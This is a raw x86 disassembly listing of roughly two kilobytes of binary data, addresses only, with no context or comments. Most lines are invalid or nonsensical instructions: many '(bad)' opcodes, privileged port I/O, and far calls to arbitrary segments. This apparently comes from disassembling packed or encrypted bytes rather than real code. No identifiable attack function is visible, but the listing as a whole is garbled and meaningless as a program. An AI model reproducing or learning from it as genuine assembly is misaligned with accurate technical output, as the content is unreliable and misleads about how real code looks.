  40cf4f:	or     BYTE PTR [esi],bh
  40cf51:	pop    edi
  40cf52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf53:	xchg   edx,eax
  40cf54:	mov    DWORD PTR [ebp-0x3f],ecx
  40cf57:	imul   al
  40cf59:	ret    
  40cf5a:	sub    ecx,DWORD PTR [edi+0x24340d1a]
  40cf60:	jecxz  0x40cf9e
  40cf62:	or     al,0x20
  40cf64:	adc    BYTE PTR [esi+0x4d098bf5],ah
  40cf6a:	loop   0x40cf5d
  40cf6c:	push   esi
  40cf6d:	aas    
  40cf6e:	pop    ebp
  40cf6f:	rcr    BYTE PTR [edx+0x24],cl
  40cf72:	retf   0xbdb4
  40cf75:	sub    BYTE PTR [ecx],0xd5
  40cf78:	mov    eax,0xae735ff1
  40cf7d:	mov    eax,0xc6869f0d
  40cf82:	ror    BYTE PTR [esi-0x30],cl
  40cf85:	push   edi
  40cf86:	jg     0x40cff0
  40cf88:	add    al,0x9e
  40cf8a:	dec    edi
  40cf8b:	and    dh,bl
  40cf8d:	fisttp QWORD PTR [edi]
  40cf8f:	out    dx,eax
  40cf90:	xchg   esp,eax
  40cf91:	nop
  40cf92:	sub    bl,BYTE PTR [ecx+0x740a31e6]
  40cf98:	aas    
  40cf99:	call   0xc9fe:0xb2581f2a
  40cfa0:	or     al,0x7c
  40cfa2:	xor    eax,0x75ae9999
  40cfa7:	jo     0x40d00b
  40cfa9:	sub    BYTE PTR [edi-0x147afa16],cl
  40cfaf:	mov    edx,0xedc4da18
  40cfb4:	pop    ds
  40cfb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfb6:	inc    ebp
  40cfb7:	rcr    BYTE PTR [eax],0x7c
  40cfba:	mul    BYTE PTR [ecx+0x1d]
  40cfbd:	and    al,0x98
  40cfbf:	sar    DWORD PTR [ebx+edx*2+0x4c535117],1
  40cfc6:	push   esi
  40cfc7:	add    cl,BYTE PTR [edx+0x77]
  40cfca:	inc    edx
  40cfcb:	dec    ebp
  40cfcc:	in     eax,dx
  40cfcd:	mov    BYTE PTR [eax],ah
  40cfcf:	test   al,0x5f
  40cfd1:	fs cli 
  40cfd3:	adc    bl,al
  40cfd5:	mov    cl,0xfd
  40cfd7:	call   0x8391:0xe56d550e
  40cfde:	ds jne 0x40d058
  40cfe1:	xor    DWORD PTR [ebp+0x31],esp
  40cfe4:	inc    esp
  40cfe5:	rol    BYTE PTR ds:0x13bf07ff,cl
  40cfeb:	ins    DWORD PTR es:[edi],dx
  40cfec:	inc    eax
  40cfed:	das    
  40cfee:	arpl   WORD PTR [ebx-0x7c66ea75],si
  40cff4:	mov    ch,0x37
  40cff6:	pop    ds
  40cff7:	push   ss
  40cff8:	and    BYTE PTR [edx-0x70],al
  40cffb:	jae    0x40cfea
  40cffd:	mov    dl,0x79
  40cfff:	inc    edi
  40d000:	mov    ah,ah
  40d002:	ds (bad) 
  40d004:	fisttp QWORD PTR [edi]
  40d006:	inc    esp
  40d007:	jnp    0x40d077
  40d009:	rcl    BYTE PTR [ecx-0x583b5bb2],cl
  40d00f:	cli    
  40d010:	test   al,0xed
  40d012:	xchg   bl,cl
  40d014:	mov    eax,0x9ca3452d
  40d019:	out    dx,eax
  40d01a:	mov    ch,0x87
  40d01c:	xchg   BYTE PTR [edi+esi*8+0x48],al
  40d020:	aad    0xb9
  40d022:	jle    0x40d002
  40d024:	push   cs
  40d025:	retf   
  40d026:	sub    DWORD PTR [ecx+0x6acf75d1],edx
  40d02c:	or     bl,ch
  40d02e:	rcl    BYTE PTR [edi+0x9729be1],cl
  40d034:	loope  0x40d019
  40d036:	push   ds
  40d037:	enter  0xe8e1,0x93
  40d03b:	mov    ebx,0x74069033
  40d040:	mov    ebp,0x9f2bb560
  40d045:	dec    esi
  40d046:	sub    edx,DWORD PTR [ebx-0x3]
  40d049:	es ins BYTE PTR es:[edi],dx
  40d04b:	sbb    cl,bh
  40d04d:	stos   BYTE PTR es:[edi],al
  40d04e:	xor    al,BYTE PTR [edi]
  40d050:	sbb    ah,BYTE PTR [ebx+ebx*4-0x41]
  40d054:	iret   
  40d055:	pop    esp
  40d056:	pop    ecx
  40d057:	adc    edi,ebx
  40d059:	mov    esi,0x8303d043
  40d05e:	push   edi
  40d05f:	adc    esi,esi
  40d061:	fwait
  40d062:	rcr    eax,cl
  40d064:	pushf  
  40d065:	sahf   
  40d066:	inc    ecx
  40d067:	in     al,0x30
  40d069:	(bad)  
  40d06a:	js     0x40d0e0
  40d06c:	push   ss
  40d06d:	add    ah,bl
  40d06f:	fdiv   DWORD PTR ds:0x372d21d0
  40d075:	jmp    FWORD PTR [ecx]
  40d077:	jb     0x40d074
  40d079:	dec    edi
  40d07a:	lea    edx,[esi-0x5e]
  40d07d:	(bad)  
  40d07e:	loopne 0x40d05c
  40d080:	push   0x4fde81f1
  40d085:	call   0x842a34e7
  40d08a:	push   es
  40d08b:	xor    DWORD PTR [edi+0x20aab690],esp
  40d091:	bound  esp,QWORD PTR [ebx]
  40d093:	daa    
  40d094:	xor    al,0x82
  40d096:	mov    ds:0x40d03173,eax
  40d09b:	lds    eax,FWORD PTR [esi-0x3d707123]
  40d0a1:	adc    BYTE PTR [edi-0x36],dh
  40d0a4:	and    eax,0x595fa722
  40d0a9:	ror    esp,1
  40d0ab:	jmp    0x40d0fc
  40d0ad:	hlt    
  40d0ae:	pop    esp
  40d0af:	and    BYTE PTR [ebp-0x47833cf0],dh
  40d0b5:	int3   
  40d0b6:	sti    
  40d0b7:	sbb    dh,BYTE PTR [bx+di]
  40d0ba:	int    0x9a
  40d0bc:	js     0x40d13a
  40d0be:	pop    edi
  40d0bf:	(bad)  
  40d0c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0c1:	push   esp
  40d0c2:	test   DWORD PTR [edi],ecx
  40d0c4:	xchg   BYTE PTR [esi-0x10],ah
  40d0c7:	(bad)  
  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	(bad)  
  40d0ee:	call   DWORD PTR [edi+0x27]
  40d0f1:	shr    DWORD PTR [edx-0x608f8f63],1
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d109
  40d0fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0fc:	cmp    DWORD PTR [edi-0x15],edi
  40d0ff:	sti    
  40d100:	or     bh,BYTE PTR [esi+0x38fdb233]
  40d106:	push   edi
  40d107:	into   
  40d108:	inc    edi
  40d109:	add    al,0xdd
  40d10b:	fldcw  WORD PTR [ecx-0x55d284d7]
  40d111:	add    ah,BYTE PTR [eax-0x65]
  40d114:	idiv   BYTE PTR [edx+0x6f8b11c7]
  40d11a:	or     BYTE PTR [ebx+0x1989e08],0x48
  40d121:	arpl   WORD PTR [esi+0x30],ax
  40d124:	sti    
  40d125:	(bad)  
  40d126:	xor    eax,0x53741e75
  40d12b:	cdq    
  40d12c:	mov    dl,BYTE PTR [edi-0x72]
  40d12f:	iret   
  40d130:	fwait
  40d131:	sub    ch,0xdb
  40d134:	and    dh,BYTE PTR [eax+0x1e80e3e3]
  40d13a:	test   eax,0xb9d3ac27
  40d13f:	lahf   
  40d140:	pop    ebp
  40d141:	outs   dx,BYTE PTR ds:[esi]
  40d142:	aad    0xef
  40d144:	xchg   edx,eax
  40d145:	or     dh,BYTE PTR [ebx]
  40d147:	xor    al,0x6a
  40d149:	test   DWORD PTR [ecx-0x1b],edx
  40d14c:	pushf  
  40d14d:	imul   eax,DWORD PTR ds:0x1d6cccba,0x9098bef0
  40d157:	je     0x40d10c
  40d159:	imul   DWORD PTR [ebx+0x19]
  40d15c:	sub    eax,0xed15a682
  40d161:	and    ah,BYTE PTR [eax-0x7a]
  40d164:	cmp    BYTE PTR [eax+0x274b0450],al
  40d16a:	pop    eax
  40d16b:	arpl   WORD PTR [edx-0x7d5eae9d],sp
  40d171:	(bad)  
  40d172:	loop   0x40d156
  40d174:	push   ebx
  40d175:	xor    BYTE PTR [ebx+0xc],bl
  40d178:	outs   dx,DWORD PTR ds:[esi]
  40d179:	pop    ecx
  40d17a:	cmp    dl,bh
  40d17c:	call   0xaa07034c
  40d181:	nop
  40d182:	xchg   edx,eax
  40d183:	add    bl,bl
  40d185:	outs   dx,BYTE PTR ds:[esi]
  40d186:	dec    edi
  40d187:	mov    al,ds:0x4d0d5360
  40d18c:	mov    ecx,0xc4ae54aa
  40d191:	outs   dx,DWORD PTR ds:[esi]
  40d192:	enter  0xdd8c,0x11
  40d196:	(bad)  
  40d197:	hlt    
  40d198:	mov    ah,0xd6
  40d19a:	gs daa 
  40d19c:	dec    edi
  40d19d:	or     bl,al
  40d19f:	pop    ecx
  40d1a0:	sbb    DWORD PTR [esi-0x66],0xffffffa0
  40d1a4:	inc    esi
  40d1a5:	lods   eax,DWORD PTR ds:[esi]
  40d1a6:	cld    
  40d1a7:	not    BYTE PTR [eax+0x1e0776fe]
  40d1ad:	loope  0x40d21e
  40d1af:	jns    0x40d19f
  40d1b1:	pop    es
  40d1b2:	mov    ds:0xb5daa9a,al
  40d1b7:	and    esp,DWORD PTR [esi+0x1a387f01]
  40d1bd:	pop    ss
  40d1be:	ja     0x40d1d3
  40d1c0:	and    esp,DWORD PTR [esi]
  40d1c2:	inc    edx
  40d1c3:	sahf   
  40d1c4:	ret    
  40d1c5:	icebp  
  40d1c6:	shr    DWORD PTR [edi-0x14cb7de2],0xa3
  40d1cd:	int    0x72
  40d1cf:	into   
  40d1d0:	mov    ah,bl
  40d1d2:	sbb    DWORD PTR [eax+0x2c],0xffffffb9
  40d1d6:	lods   eax,DWORD PTR ds:[esi]
  40d1d7:	test   ecx,edx
  40d1d9:	pop    esp
  40d1da:	addr16 add eax,ebx
  40d1dd:	pop    esi
  40d1de:	gs imul edi,ebp,0xf11468c0
  40d1e5:	dec    ecx
  40d1e6:	sub    ch,BYTE PTR [ecx+0x7ce1a07c]
  40d1ec:	fwait
  40d1ed:	retf   0x575
  40d1f0:	loop   0x40d1b1
  40d1f2:	jmp    0x6000:0xfd0322e6
  40d1f9:	(bad)  
  40d1fb:	adc    DWORD PTR [edx-0x52],ebp
  40d1fe:	pop    es
  40d1ff:	jmp    0x640328da
  40d204:	into   
  40d205:	aas    
  40d206:	jg     0x40d1cc
  40d208:	stos   BYTE PTR es:[edi],al
  40d209:	cs dec edi
  40d20b:	jl     0x40d287
  40d20d:	out    0x5d,al
  40d20f:	jmp    DWORD PTR [edx+eiz*4]
  40d212:	dec    esp
  40d213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d214:	xor    eax,0xf0862306
  40d219:	adc    bl,BYTE PTR [eax+0x22632f8f]
  40d21f:	dec    ecx
  40d220:	out    0x4,eax
  40d222:	fs xchg esp,eax
  40d224:	add    al,BYTE PTR [edi+0x1d]
  40d227:	pop    ds
  40d228:	add    DWORD PTR [eax],edi
  40d22a:	pop    edi
  40d22b:	add    ah,BYTE PTR [edi-0x74045220]
  40d231:	scas   eax,DWORD PTR es:[edi]
  40d232:	cwde   
  40d233:	jne    0x40d27a
  40d235:	push   ss
  40d236:	or     esp,esp
  40d238:	lahf   
  40d239:	shl    DWORD PTR [eax],1
  40d23b:	outs   dx,BYTE PTR ds:[esi]
  40d23c:	or     eax,0x2146ef1f
  40d241:	loope  0x40d20f
  40d243:	cmp    BYTE PTR [ebp-0x2e],ah
  40d246:	sub    ebx,0x7a073930
  40d24c:	jo     0x40d24e
  40d24e:	iret   
  40d24f:	fdivr  QWORD PTR [edx+0x7e]
  40d252:	out    dx,eax
  40d253:	cwde   
  40d254:	outs   dx,BYTE PTR ds:[esi]
  40d255:	into   
  40d256:	lods   al,BYTE PTR ds:[esi]
  40d257:	cmp    ah,dl
  40d259:	sub    bh,BYTE PTR [eax-0x3a]
  40d25c:	test   eax,0xeacc9c2f
  40d261:	ins    BYTE PTR es:[edi],dx
  40d262:	xor    BYTE PTR [edx-0x6b31f6c5],ch
  40d268:	sahf   
  40d269:	adc    dl,BYTE PTR [esi]
  40d26b:	pop    ebx
  40d26c:	push   es
  40d26d:	repnz int 0x7c
  40d270:	lds    eax,FWORD PTR [ecx+0x5e]
  40d273:	dec    eax
  40d274:	out    dx,eax
  40d275:	cmp    eax,edi
  40d277:	mov    ebp,0x2fc68f8d
  40d27c:	mov    DWORD PTR [edi-0x4944453f],0x2b1b99d9
  40d286:	xchg   BYTE PTR [edx+0x8],ch
  40d289:	int3   
  40d28a:	dec    edx
  40d28b:	push   es
  40d28c:	sahf   
  40d28d:	bound  edi,QWORD PTR [ebx-0x2e]
  40d290:	mov    ecx,0xa4bce856
  40d295:	mov    dl,0xf1
  40d297:	jbe    0x40d23a
  40d299:	and    DWORD PTR [eax],ebx
  40d29b:	sahf   
  40d29c:	shl    DWORD PTR [eax+0x79],1
  40d29f:	popa   
  40d2a0:	call   0x9de7:0x4cfbd4fe
  40d2a7:	int    0xbc
  40d2a9:	mov    eax,ds:0xbf15bc40
  40d2ae:	leave  
  40d2af:	cs mov ecx,0x8d23630
  40d2b5:	adc    dl,cl
  40d2b7:	(bad)  
  40d2b8:	inc    edx
  40d2b9:	in     eax,dx
  40d2ba:	rcr    BYTE PTR [esp+edi*2+0x56bcc38f],1
  40d2c1:	or     eax,0x8edb770
  40d2c6:	pop    edi
  40d2c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2c8:	pusha  
  40d2c9:	dec    esp
  40d2ca:	push   ebx
  40d2cb:	jl     0x40d344
  40d2cd:	sbb    eax,0x53ed70bb
  40d2d2:	dec    edx
  40d2d3:	adc    ah,ch
  40d2d5:	push   edx
  40d2d6:	mov    al,0x2b
  40d2d8:	jle    0x40d2b7
  40d2da:	nop
  40d2db:	test   eax,0x879cbbff
  40d2e0:	inc    ebx
  40d2e1:	inc    esp
  40d2e2:	in     al,0x3d
  40d2e4:	js     0x40d2a2
  40d2e6:	popa   
  40d2e7:	fisub  WORD PTR [edx+0x3f]
  40d2ea:	clc    
  40d2eb:	test   al,0xca
  40d2ed:	mov    ecx,0x5525fa6a
  40d2f2:	push   ds
  40d2f3:	inc    esp
  40d2f4:	mov    ch,0x86
  40d2f6:	mov    bl,0x67
  40d2f8:	nop
  40d2f9:	cdq    
  40d2fa:	into   
  40d2fb:	sbb    ebp,eax
  40d2fd:	fistp  QWORD PTR [eax]
  40d2ff:	jnp    0x40d374
  40d301:	and    BYTE PTR [esi+0x1],bl
  40d304:	out    dx,eax
  40d305:	xlat   BYTE PTR ds:[ebx]
  40d306:	fimul  WORD PTR ds:[esi+esi*1-0x23]
  40d30b:	and    BYTE PTR [ebp+0x3f],dl
  40d30e:	adc    eax,0xe29f07e
  40d313:	adc    al,0x96
  40d315:	loopne 0x40d2e2
  40d317:	mov    ds:0x7021fd0,eax
  40d31c:	mov    al,ds:0x35a2e311
  40d321:	data16 (bad) 
  40d323:	rcl    DWORD PTR [eax-0x4f],1
  40d326:	jnp    0x40d384
  40d328:	sbb    BYTE PTR [ebx],dh
  40d32a:	adc    edx,DWORD PTR [ebx+0x38]
  40d32d:	loop   0x40d3a4
  40d32f:	lds    ebx,FWORD PTR [edi+0x76ff32e2]
  40d335:	test   BYTE PTR [edi+ebx*2-0x71034685],dh
  40d33c:	pusha  
  40d33d:	pop    ecx
  40d33e:	sub    eax,0x98012655
  40d343:	mov    ds:0x591699ce,al
  40d348:	sub    BYTE PTR [ebx+0x2e7eafbf],cl
  40d34e:	cdq    
  40d34f:	mov    eax,0xb86af05
  40d354:	cmp    ecx,DWORD PTR [edi-0x6e]
  40d357:	iret   
  40d358:	stos   BYTE PTR es:[edi],al
  40d359:	xor    eax,0xf17c2ea5
  40d35e:	push   edi
  40d35f:	add    eax,esp
  40d361:	or     eax,0xf1997163
  40d366:	call   0xc6f3:0x3683c81d
  40d36d:	xor    eax,0xb4ffc2c3
  40d372:	pusha  
  40d373:	out    0xdc,al
  40d375:	in     al,dx
  40d376:	ss inc edx
  40d378:	ret    
  40d379:	mov    BYTE PTR [esi+0x10c3a33b],dh
  40d37f:	hlt    
  40d380:	add    bh,bl
  40d382:	jnp    0x40d3ad
  40d384:	ror    ch,1
  40d386:	repnz mov eax,0x1da2f6d3
  40d38c:	ins    BYTE PTR es:[edi],dx
  40d38d:	ja     0x40d3e5
  40d38f:	rcr    DWORD PTR [esi],cl
  40d391:	add    DWORD PTR [edx],0x826dd7e
  40d397:	pop    ebx
  40d398:	out    dx,eax
  40d399:	int3   
  40d39a:	mov    edi,ecx
  40d39c:	xor    cl,BYTE PTR [ecx+0x54]
  40d39f:	and    eax,0x2b43afcb
  40d3a4:	sub    ebp,edi
  40d3a6:	mov    dh,0x7
  40d3a8:	push   es
  40d3a9:	in     eax,0x9c
  40d3ab:	or     ecx,DWORD PTR [edi]
  40d3ad:	mov    edi,0x396332fd
  40d3b2:	fdivr  st(0),st
  40d3b4:	mov    al,BYTE PTR [ecx-0x27]
  40d3b7:	xchg   ebp,eax
  40d3b8:	test   al,0xf3
  40d3ba:	leave  
  40d3bb:	xlat   BYTE PTR ds:[ebx]
  40d3bc:	aad    0xfe
  40d3be:	inc    eax
  40d3bf:	dec    edi
  40d3c0:	add    eax,0x66418292
  40d3c5:	fdivr  DWORD PTR [edx-0x1]
  40d3c8:	aaa    
  40d3c9:	pop    edi
  40d3ca:	mov    ecx,0xbb33f12a
  40d3cf:	icebp  
  40d3d0:	ret    0x3bce
  40d3d3:	cmp    BYTE PTR [edi-0x40d6cf92],dh
  40d3d9:	outs   dx,BYTE PTR ds:[esi]
  40d3da:	imul   ebp,esp,0xf2f0d45b
  40d3e0:	stos   DWORD PTR es:[edi],eax
  40d3e1:	enter  0xfa5d,0x5c
  40d3e5:	add    BYTE PTR [ebx-0x25],0x8d
  40d3e9:	pop    ds
  40d3ea:	or     ch,dl
  40d3ec:	cs and al,0xc8
  40d3ef:	mov    bh,0x88
  40d3f1:	(bad)  
  40d3f2:	sahf   
  40d3f3:	lea    edi,[ebp+0x4c]
  40d3f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3f7:	(bad)  
  40d3f8:	aas    
  40d3f9:	imul   bl
  40d3fb:	inc    ecx
  40d3fc:	icebp  
  40d3fd:	push   0xffffff86
  40d3ff:	fmul   QWORD PTR [esi]
  40d401:	aas    
  40d402:	ret    
  40d403:	and    BYTE PTR [eax-0x5fccb9ee],dl
  40d409:	xor    dl,BYTE PTR [edx+0x22]
  40d40c:	lods   al,BYTE PTR ds:[esi]
  40d40d:	pop    ebp
  40d40e:	adc    BYTE PTR [eax-0x77aba6c3],bl
  40d414:	clc    
  40d415:	mov    WORD PTR [ecx-0x10],ss
  40d418:	push   ds
  40d419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d41a:	fidiv  DWORD PTR [ecx+0x1773fc7b]
  40d420:	sbb    eax,0x37fc1341
  40d425:	aad    0x0
  40d427:	int3   
  40d428:	gs (bad) 
  40d42b:	or     bh,BYTE PTR [esi-0x1f]
  40d42e:	mov    eax,0xf8b22d3c
  40d433:	jnp    0x40d3f9
  40d435:	push   ecx
  40d436:	cmc    
  40d437:	das    
  40d438:	sbb    bh,dh
  40d43a:	xor    edx,DWORD PTR [ebx-0x4af7f75c]
  40d440:	jo     0x40d481
  40d442:	mov    esp,0x6f337d95
  40d447:	dec    esi
  40d448:	mov    ebx,?
  40d44a:	(bad)  
  40d44b:	scas   al,BYTE PTR es:[edi]
  40d44c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d44d:	fwait
  40d44e:	mov    bh,0xe7
  40d450:	out    dx,eax
  40d451:	aaa    
  40d452:	nop
  40d453:	fidivr WORD PTR [eax+0x4b5137bc]
  40d459:	pcmpeqb mm5,QWORD PTR cs:[ebp+eiz*4-0x1b747808]
  40d462:	inc    esi
  40d463:	sets   BYTE PTR [ebx+esi*4]
  40d467:	xor    al,0x77
  40d469:	push   ebp
  40d46a:	and    al,0xbb
  40d46c:	test   eax,0x1ad5c735
  40d471:	xchg   ecx,eax
  40d472:	shl    DWORD PTR [ebp-0x6ab14c9d],0xe9
  40d479:	daa    
  40d47a:	ret    0xa9e2
  40d47d:	xor    eax,0xaefe7e8a
  40d482:	dec    edi
  40d483:	xchg   ecx,eax
  40d484:	and    BYTE PTR [ebx-0x1a72f1fc],bh
  40d48a:	fisttp WORD PTR [ecx-0x36]
  40d48d:	loope  0x40d4bf
  40d48f:	setbe  BYTE PTR [esp+0x3cadcbe7]
  40d497:	dec    eax
  40d498:	xor    esp,esi
  40d49a:	sbb    DWORD PTR [ebx-0x6b720783],ecx
  40d4a0:	cmp    bl,BYTE PTR [edx+esi*2+0x55890032]
  40d4a7:	clc    
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0x3fd3:0xb81a1d63
  40d4c6:	es jecxz 0x40d4d4
  40d4c9:	leave  
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d48b
  40d4d2:	vpcmpeqw xmm0,xmm7,XMMWORD PTR es:[edi+ecx*1+0x69]
  40d4d9:	addr16 mov dl,0x16
  40d4dc:	push   eax
  40d4dd:	pop    es
  40d4de:	xcrypt-ctr (bad)
  40d4df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4e0:	sbb    eax,0xee72d699
  40d4e5:	fmul   QWORD PTR [ebx-0x51]
  40d4e8:	sub    esp,DWORD PTR [edx-0xa]
  40d4eb:	test   BYTE PTR [eax],bh
  40d4ed:	sub    al,0x25
  40d4ef:	jmp    0x40d4c3
  40d4f1:	jne    0x40d4f2
  40d4f3:	out    0xa9,al
  40d4f5:	shl    bl,1
  40d4f7:	sbb    DWORD PTR [edx+eiz*2],edi
  40d4fa:	xchg   DWORD PTR ss:[ecx],eax
  40d4fd:	mov    WORD PTR [ecx+0x1b],ss
  40d500:	mov    esi,0x89a2b30f
  40d505:	div    BYTE PTR [edi]
  40d507:	je     0x40d49a
  40d509:	jg     0x40d4f9
  40d50b:	(bad)  
  40d50c:	adc    eax,0xea6d0122
  40d511:	mov    WORD PTR [esi+ecx*1-0x6ae96211],ds
  40d518:	xor    esp,DWORD PTR [eax]
  40d51a:	dec    esi
  40d51b:	sahf   
  40d51c:	cli    
  40d51d:	fst    st(4)
  40d51f:	sub    eax,0x762d7bd9
  40d524:	in     eax,dx
  40d525:	mov    ch,BYTE PTR [edi-0x65]
  40d528:	inc    edi
  40d529:	mov    ebx,0xd0bfb552
  40d52e:	inc    ebp
  40d52f:	fs jl  0x40d547
  40d532:	mov    eax,ds:0xcac8aa21
  40d537:	inc    esp
  40d538:	xchg   edx,eax
  40d539:	push   edx
  40d53a:	push   ss
  40d53b:	xchg   DWORD PTR [esi],edx
  40d53d:	jecxz  0x40d55a
  40d53f:	mov    ds:0xc0fdc96c,eax
  40d544:	dec    edx
  40d545:	dec    ecx
  40d546:	pop    ds
  40d547:	dec    ebp
  40d548:	mov    al,0x67
  40d54a:	stos   BYTE PTR es:[edi],al
  40d54b:	aaa    
  40d54c:	lods   al,BYTE PTR ds:[esi]
  40d54d:	daa    
  40d54e:	or     eax,DWORD PTR [esi+0xc]
  40d551:	add    BYTE PTR [esi-0x31],al
  40d554:	in     al,dx
  40d555:	mov    al,BYTE PTR [ecx-0x60]
  40d558:	push   ebp
  40d559:	pop    ecx
  40d55a:	xchg   edi,eax
  40d55b:	adc    DWORD PTR [edi+0xa3d6e89],eax
  40d561:	repnz cwde 
  40d563:	adc    BYTE PTR [edx],dl
  40d565:	push   ds
  40d566:	call   0x79a8:0xfa364392
  40d56d:	test   eax,0x680c6b39
  40d572:	vmulpd xmm2,xmm6,XMMWORD PTR [esi-0xd0074dd]
  40d57a:	(bad)  
  40d57b:	mov    cl,bl
  40d57d:	push   esi
  40d57e:	scas   eax,DWORD PTR es:[edi]
  40d57f:	mov    al,0x8b
  40d581:	fisubr DWORD PTR [ecx-0x1b]
  40d584:	ficomp DWORD PTR [ecx]
  40d586:	dec    edx
  40d587:	adc    al,0xba
  40d589:	dec    ecx
  40d58a:	fild   QWORD PTR [ecx]
  40d58c:	in     eax,dx
  40d58d:	sti    
  40d58e:	jl     0x40d58c
  40d590:	into   
  40d591:	je     0x40d5e2
  40d593:	mov    WORD PTR [edx+0x7e],?
  40d596:	out    0x57,al
  40d598:	fs dec edx
  40d59a:	adc    al,0xba
  40d59c:	mov    ecx,0xae3c63f8
  40d5a1:	pusha  
  40d5a2:	shl    BYTE PTR [ebx-0x55e751d5],cl
  40d5a8:	jns    0x40d59c
  40d5aa:	(bad)  
  40d5ab:	fucomi st,st(7)
  40d5ad:	mov    edx,0x708c50c3
  40d5b2:	xchg   edx,eax
  40d5b3:	push   ecx
  40d5b4:	jne    0x40d627
  40d5b6:	jb     0x40d5a8
  40d5b8:	add    dl,BYTE PTR [ebp+0x1e]
  40d5bb:	stc    
  40d5bc:	add    ebx,DWORD PTR [eax-0x69]
  40d5bf:	cmp    ecx,eax
  40d5c1:	pusha  
  40d5c2:	push   esp
  40d5c3:	(bad)  [edx+0x27]
  40d5c6:	push   esp
  40d5c7:	mov    al,0xf5
  40d5c9:	jmp    0x6c83:0x50bbc25b
  40d5d0:	comiss xmm2,DWORD PTR [ebx]
  40d5d3:	fnstcw WORD PTR [ebp-0x4d]
  40d5d6:	shl    BYTE PTR [ebp-0x1aa5c223],cl
  40d5dc:	cs jl  0x40d638
  40d5df:	xchg   DWORD PTR ss:[ebp-0x2bbdfc8c],esi
  40d5e6:	imul   eax,ecx,0xe845c08a
  40d5ec:	inc    ebx
  40d5ed:	out    0x5e,eax
  40d5ef:	jecxz  0x40d5a9
  40d5f1:	ret    
  40d5f2:	and    bl,ch
  40d5f4:	enter  0x71b7,0x64
  40d5f8:	fild   QWORD PTR [eax-0x24]
  40d5fb:	test   DWORD PTR [ebx+0x3e52d333],esi
  40d601:	test   BYTE PTR ds:0xae391edd,cl
  40d607:	fwait
  40d608:	xor    BYTE PTR [edi],cl
  40d60a:	cmp    DWORD PTR [ecx],ebx
  40d60c:	scas   al,BYTE PTR es:[edi]
  40d60d:	dec    ebx
  40d60e:	int    0x2d
  40d610:	and    ah,bh
  40d612:	mov    ds:0x91c4e9af,eax
  40d617:	xchg   edi,eax
  40d618:	test   DWORD PTR [ecx-0x6c],ebx
  40d61b:	ret    0xc499
  40d61e:	jmp    0x684c83f9
  40d623:	push   esi
  40d624:	pmaxsw mm2,QWORD PTR [edx+0x62]
  40d628:	jno    0x40d65c
  40d62a:	out    dx,eax
  40d62b:	ss dec esi
  40d62d:	fdivr  st(5),st
  40d62f:	and    dh,BYTE PTR [esi+0x6f]
  40d632:	cdq    
  40d633:	adc    DWORD PTR [ecx],eax
  40d635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d636:	lea    ecx,[edx+0x580d9320]
  40d63c:	rcr    BYTE PTR [ebp-0x22],1
  40d63f:	xchg   edx,eax
  40d640:	retf   
  40d641:	push   ecx
  40d642:	ins    DWORD PTR es:[edi],dx
  40d643:	imul   edi,esi,0xffffffc3
  40d646:	and    eax,0xf0ef96cf
  40d64b:	mov    ds:0xb0d39527,eax
  40d650:	jb     0x40d646
  40d652:	xchg   ebx,eax
  40d653:	cli    
  40d654:	je     0x40d622
  40d656:	xchg   ebx,eax
  40d657:	in     eax,dx
  40d658:	inc    edx
  40d659:	sbb    eax,0x4726adcc
  40d65e:	cdq    
  40d65f:	mov    esi,0xe8ab337e
  40d664:	addr16 sti 
  40d666:	xor    cl,BYTE PTR [eax-0x5c6c30d0]
  40d66c:	and    esp,0xbd45a866
  40d672:	xchg   esp,eax
  40d673:	adc    eax,0xa3ad461b
  40d678:	fcomp  QWORD PTR [ecx]
  40d67a:	lock and eax,0xb7749a29
  40d680:	mov    al,cl
  40d682:	sar    BYTE PTR [edi-0x61],cl
  40d685:	retf   
  40d686:	pusha  
  40d687:	outs   dx,BYTE PTR ds:[esi]
  40d688:	outs   dx,DWORD PTR ds:[esi]
  40d689:	pop    ds
  40d68a:	inc    ebx
  40d68b:	adc    BYTE PTR [ebx],cl
  40d68d:	mov    al,0x90
  40d68f:	xchg   DWORD PTR [edx-0x72],edx
  40d692:	das    
  40d693:	pop    ds
  40d694:	enter  0x124e,0x2b
  40d698:	mov    BYTE PTR [edx-0x15fa8fed],dh
  40d69e:	mov    edx,0x5c8cbb6d
  40d6a3:	cs cdq 
  40d6a5:	pop    ecx
  40d6a6:	mov    al,ds:0x4bb18cc7
  40d6ab:	shr    BYTE PTR [esi-0x35],0xfb
  40d6af:	pop    esp
  40d6b0:	xchg   esi,eax
  40d6b1:	inc    edx
  40d6b2:	xchg   esp,eax
  40d6b3:	(bad)  
